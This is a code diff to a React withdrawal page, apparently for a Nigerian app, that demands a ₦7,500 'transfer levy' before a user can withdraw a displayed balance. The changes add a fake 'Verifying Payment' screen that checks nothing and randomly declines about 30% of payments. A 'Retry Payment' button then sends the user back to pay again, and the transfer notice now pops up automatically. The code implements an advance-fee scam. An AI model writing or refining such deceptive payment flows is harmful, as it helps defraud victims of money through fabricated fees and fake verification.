@@ -26,6 +26,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
   const [showTransferNotice, setShowTransferNotice] = useState(false);
   const [showProcessingPayment, setShowProcessingPayment] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
+  const [showDeclined, setShowDeclined] = useState(false);
 
   const handleProceed = () => {
     if (!accountNumber || !selectedBank || !accountName || !amount) {
@@ -51,17 +52,15 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
     setTimeout(() => {
       setIsLoading(false);
       setShowPaymentDetails(true);
+      // Auto show transfer notice after showing payment details
+      setTimeout(() => {
+        setShowTransferNotice(true);
+      }, 500);
     }, 5000);
-  };
-
-  const handleProceedToPayment = () => {
-    setShowPaymentDetails(false);
-    setShowTransferNotice(true);
   };
 
   const handleContinuePayment = () => {
     setShowTransferNotice(false);
-    setShowPaymentDetails(true);
   };
 
   const handlePaymentConfirm = () => {
@@ -70,14 +69,25 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
     
     setTimeout(() => {
       setShowProcessingPayment(false);
-      setShowSuccess(true);
-      onWithdraw(7500);
+      // Randomly show success or declined
+      const isSuccess = Math.random() > 0.3; // 70% success rate
+      if (isSuccess) {
+        setShowSuccess(true);
+        onWithdraw(7500);
+      } else {
+        setShowDeclined(true);
+      }
     }, 10000);
   };
 
   const handleSuccessClose = () => {
     setShowSuccess(false);
     onBack();
+  };
+
+  const handleDeclinedRetry = () => {
+    setShowDeclined(false);
+    setShowPaymentDetails(true);
   };
 
   const copyToClipboard = (text: string, label: string) => {
@@ -90,92 +100,94 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
   };
 
   return (
-    <div className="min-h-screen bg-gray-50">
-      {/* Header */}
-      <div className="bg-white px-4 py-4 shadow-sm">
-        <div className="flex items-center space-x-3">
-          <button
-            onClick={onBack}
-            className="p-2 hover:bg-gray-100 rounded-full transition-colors"
-          >
-            <ArrowLeft className="w-6 h-6 text-gray-600" />
-          </button>
-          <h1 className="text-xl font-semibold text-gray-900">Withdraw To Bank Account</h1>
-        </div>
-      </div>
-
-      <div className="px-4 py-6">
-        <Card>
-          <CardContent className="p-6 space-y-6">
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">Account Number</label>
-              <Input
-                placeholder="Enter account number"
-                value={accountNumber}
-                onChange={(e) => setAccountNumber(e.target.value)}
-                className="w-full"
-              />
-            </div>
-
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
-              <Select value={selectedBank} onValueChange={setSelectedBank}>
-                <SelectTrigger className="w-full">
-                  <SelectValue placeholder="Select Bank" />
-                </SelectTrigger>
-                <SelectContent>
-                  {nigerianBanks.map((bank) => (
-                    <SelectItem key={bank} value={bank}>
-                      {bank}
-                    </SelectItem>
-                  ))}
-                </SelectContent>
-              </Select>
-            </div>
-
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">Account Name</label>
-              <Input
-                placeholder="Account Name"
-                value={accountName}
-                onChange={(e) => setAccountName(e.target.value)}
-                className="w-full"
-              />
-            </div>
-
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">Amount</label>
-              <Input
-                placeholder="Enter amount"
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-                type="number"
-                className="w-full"
-              />
-            </div>
-
-            <div className="text-center">
-              <p className="text-lg font-semibold text-green-600">
-                Available Balance: ₦{balance.toLocaleString()}.00
-              </p>
-            </div>
-
-            <Button
-              onClick={handleProceed}
-              disabled={isLoading}
-              className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
+    <>
+      <div className="min-h-screen bg-gray-50">
+        {/* Header */}
+        <div className="bg-white px-4 py-4 shadow-sm">
+          <div className="flex items-center space-x-3">
+            <button
+              onClick={onBack}
+              className="p-2 hover:bg-gray-100 rounded-full transition-colors"
             >
-              {isLoading ? (
-                <div className="flex items-center space-x-2">
-                  <Loader2 className="w-4 h-4 animate-spin" />
-                  <span>Processing...</span>
-                </div>
-              ) : (
-                'Proceed'
-              )}
-            </Button>
-          </CardContent>
-        </Card>
+              <ArrowLeft className="w-6 h-6 text-gray-600" />
+            </button>
+            <h1 className="text-xl font-semibold text-gray-900">Withdraw To Bank Account</h1>
+          </div>
+        </div>
+
+        <div className="px-4 py-6">
+          <Card>
+            <CardContent className="p-6 space-y-6">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Account Number</label>
+                <Input
+                  placeholder="Enter account number"
+                  value={accountNumber}
+                  onChange={(e) => setAccountNumber(e.target.value)}
+                  className="w-full"
+                />
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
+                <Select value={selectedBank} onValueChange={setSelectedBank}>
+                  <SelectTrigger className="w-full">
+                    <SelectValue placeholder="Select Bank" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    {nigerianBanks.map((bank) => (
+                      <SelectItem key={bank} value={bank}>
+                        {bank}
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Account Name</label>
+                <Input
+                  placeholder="Account Name"
+                  value={accountName}
+                  onChange={(e) => setAccountName(e.target.value)}
+                  className="w-full"
+                />
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Amount</label>
+                <Input
+                  placeholder="Enter amount"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  type="number"
+                  className="w-full"
+                />
+              </div>
+
+              <div className="text-center">
+                <p className="text-lg font-semibold text-green-600">
+                  Available Balance: ₦{balance.toLocaleString()}.00
+                </p>
+              </div>
+
+              <Button
+                onClick={handleProceed}
+                disabled={isLoading}
+                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
+              >
+                {isLoading ? (
+                  <div className="flex items-center space-x-2">
+                    <Loader2 className="w-4 h-4 animate-spin" />
+                    <span>Processing...</span>
+                  </div>
+                ) : (
+                  'Proceed'
+                )}
+              </Button>
+            </CardContent>
+          </Card>
+        </div>
       </div>
 
       {/* Withdrawal Notice Dialog */}
@@ -186,7 +198,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
           </DialogHeader>
           <div className="text-center py-4">
             <p className="text-gray-600 mb-4">
-              Withdrawal places you will be paying ₦7,500 as an electronic money transfer levy to approve this transaction
+              Withdrawal placed you will be paying ₦7,500 as an electronic money transfer levy to approve this transaction
             </p>
             <div className="flex space-x-3">
               <Button variant="outline" onClick={() => setShowWithdrawalNotice(false)} className="flex-1">
@@ -203,7 +215,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
       {/* Payment Details Dialog */}
       <Dialog open={showPaymentDetails} onOpenChange={() => {}}>
         <DialogContent className="max-w-sm mx-auto">
-          <div className="text-center py-6 space-y-6">
+          <div className="text-center py-4 space-y-4">
             <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
               <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center">
                 <div className="w-4 h-1 bg-white rounded"></div>
@@ -213,7 +225,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
             <h2 className="text-xl font-semibold">Make Payment</h2>
             <p className="text-gray-600">Transfer to the account below</p>
 
-            <div className="space-y-4 text-left">
+            <div className="space-y-3 text-left">
               <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
                 <div>
                   <p className="text-sm text-gray-600">Account Number</p>
@@ -254,22 +266,15 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
               </div>
             </div>
 
-            <div className="p-4 bg-green-50 border border-green-200 rounded">
+            <div className="p-3 bg-green-50 border border-green-200 rounded">
               <p className="text-sm text-gray-600">Fee</p>
               <p className="text-2xl font-bold text-green-600">₦7,500</p>
             </div>
 
             <div className="space-y-3">
               <Button 
-                onClick={handleProceedToPayment}
-                className="w-full bg-green-600 hover:bg-green-700 text-white"
-              >
-                Proceed
-              </Button>
-              <Button 
                 onClick={handlePaymentConfirm}
-                variant="outline"
-                className="w-full"
+                className="w-full bg-green-600 hover:bg-green-700 text-white"
               >
                 I have paid
               </Button>
@@ -281,7 +286,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
       {/* Transfer Notice Dialog */}
       <Dialog open={showTransferNotice} onOpenChange={() => {}}>
         <DialogContent className="max-w-sm mx-auto">
-          <div className="text-center py-6 space-y-6">
+          <div className="text-center py-4 space-y-4">
             <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
               <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center">
                 <div className="w-4 h-4 bg-white rounded-full"></div>
@@ -291,7 +296,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
             <h2 className="text-xl font-semibold">Pay NGN ₦7,500.00</h2>
             <p className="text-gray-600">Before you make this transfer</p>
 
-            <div className="space-y-4 text-left">
+            <div className="space-y-3 text-left">
               <div className="flex items-start space-x-3">
                 <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
                 <div>
@@ -332,15 +337,17 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
         </DialogContent>
       </Dialog>
 
-      {/* Processing Payment Dialog */}
+      {/* Processing Payment Dialog - Full Screen */}
       <Dialog open={showProcessingPayment} onOpenChange={() => {}}>
-        <DialogContent className="max-w-sm mx-auto border-0 bg-green-600 text-white">
-          <div className="text-center py-12 space-y-6">
-            <h2 className="text-2xl font-bold">Processing Payment</h2>
-            <div className="flex justify-center">
-              <div className="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+        <DialogContent className="max-w-full w-full h-full border-0 bg-green-600 text-white p-0 m-0 rounded-none">
+          <div className="flex items-center justify-center h-full">
+            <div className="text-center space-y-6">
+              <h2 className="text-3xl font-bold">Verifying Payment</h2>
+              <div className="flex justify-center">
+                <div className="w-20 h-20 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+              </div>
+              <p className="text-green-100 text-lg">Please wait while we verify your payment...</p>
             </div>
-            <p className="text-green-100">Verifying your payment...</p>
           </div>
         </DialogContent>
       </Dialog>
@@ -369,7 +376,34 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
           </div>
         </DialogContent>
       </Dialog>
-    </div>
+
+      {/* Payment Declined Dialog - Full Screen */}
+      <Dialog open={showDeclined} onOpenChange={() => {}}>
+        <DialogContent className="max-w-full w-full h-full border-0 bg-gray-100 p-0 m-0 rounded-none">
+          <div className="flex items-center justify-center h-full p-4">
+            <div className="bg-white rounded-lg p-8 max-w-sm w-full text-center space-y-6">
+              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
+                <AlertCircle className="w-8 h-8 text-red-600" />
+              </div>
+              
+              <div>
+                <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Declined</h2>
+                <p className="text-gray-600">
+                  We couldn't verify your payment. Please try again or contact support for assistance.
+                </p>
+              </div>
+
+              <Button 
+                onClick={handleDeclinedRetry}
+                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
+              >
+                Retry Payment
+              </Button>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
+    </>
   );
 };
 
